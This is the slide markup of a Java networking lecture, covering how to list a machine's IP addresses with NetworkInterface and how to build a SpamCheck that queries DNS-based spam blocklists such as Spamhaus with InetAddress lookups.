              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ni.getInetAddresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>asIterator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>forEachRemaining</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> -&gt; {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>            if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>instanceof</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Inet4Address) {  // Prefer IPv4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>("Active IP: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>addr.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>            }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>        });</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>});</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Prioritize Non-Loopback, Non-Link-Local Addresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Exclude 127.0.0.1 (loopback) and 169.254.x.x (link-local).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Use Network Metrics</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Check the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>default route</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> (e.g., via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>NetworkInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> metrics).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Prefer the interface with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>active internet connectivity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800"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402166" y="838200"/>
            <a:ext cx="11387668" cy="5829288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Expected Observations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Wired vs. wireless connections may show different IPs (different interfaces).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Systems with VPNs or virtual NICs may list more IPs than expected.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>The "desired" IP depends on context (e.g., public vs. private IP for services).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Key Question:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buChar char="¡"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>How would you modify your program to reliably identify the IP used for external communication?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2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9. Spam Detection (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SpamCheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402166" y="2286000"/>
            <a:ext cx="11387667" cy="3200400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Implement reverse DNS checks to identify suspicious hosts.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Integrate with blocklists (e.g., DNSBLs).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can build a basic spam/IP reputation checker.</a:t>
            </a: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xfrm>
            <a:off x="1603375" y="123823"/>
            <a:ext cx="8540750" cy="838200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>Application of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>InetAddress : SpamCheck</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63491" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1033463"/>
            <a:ext cx="11277600" cy="1371597"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>Application Question: When programming a server, how can you quickly check to see if an address is from a known spammer?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63492" name="流程图: 文档 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8458200" y="2590800"/>
            <a:ext cx="1676400" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartDocumen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400">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Realtime Blackhole List </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RBL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400"/>
              <a:t>Realtime Blackhole List, the IP addresses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400"/>
              <a:t>in the list indicate that they have sent spam emails to the outside world</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1400"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63493" name="流程图: 过程 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5943600" y="2568576"/>
            <a:ext cx="1981200" cy="1546225"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartProcess">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Mail Server</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="63494" name="直接连接符 6"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7924800" y="3341688"/>
            <a:ext cx="533400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="95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流程图: 过程 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2667000" y="2895600"/>
            <a:ext cx="1143000" cy="952500"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartProcess">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GB" altLang="en-US"/>
              <a:t>Email sender</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="流程图: 过程 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4114800" y="4800600"/>
            <a:ext cx="1143000" cy="952500"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartProcess">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GB" altLang="en-US"/>
              <a:t>Email Recipient</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="流程图: 过程 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6324600" y="4941888"/>
            <a:ext cx="1143000" cy="952500"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartProcess">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GB" altLang="en-US"/>
              <a:t>Email Recipient</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="63498" name="直接箭头连接符 11"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="5181600" y="4114800"/>
            <a:ext cx="762000" cy="6858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499" name="直接箭头连接符 13"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7162800" y="4114800"/>
            <a:ext cx="0" cy="827088"/>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500" name="直接箭头连接符 15"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="3810000" y="3048000"/>
            <a:ext cx="2133600" cy="762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501" name="圆角矩形 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6248400" y="3048000"/>
            <a:ext cx="1447800" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00B050"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:rou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Spam Monitoring Services</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63502" name="TextBox 20"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="276225" y="5998209"/>
            <a:ext cx="90487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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spam monitoring service:</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A quick query response is required to determine whether it is a spam sending request.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>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a:xfrm>
            <a:off x="762000" y="228600"/>
            <a:ext cx="10515599" cy="609600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" dirty="0" err="1"/>
              <a:t>SpamCheck</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" dirty="0"/>
              <a:t> Implementation Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="990600"/>
            <a:ext cx="10515598" cy="5562600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Objective</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: Verify if an IP address is listed in a DNS-based spam blocklist (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Spamhaus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> SBL).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Step-by-Step Process</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Reverse the IP Address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Convert A.B.C.D → D.C.B.A</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>For IP 192.168.1.100, reverse to 100.1.168.192</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" lvl="0" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Construct the DNSBL lookup Query</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Append to a blocklist domain (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Spamhaus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> SBL):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>Perform DNS Lookup</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> to check if the query resolves:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>() to attempt resolution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>Interpret Results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Successful resolution: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>Spammer (listed in blocklist). </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>IP is listed (returns true)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>: Clean IP. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>IP is not listed (returns false)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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228600" y="152400"/>
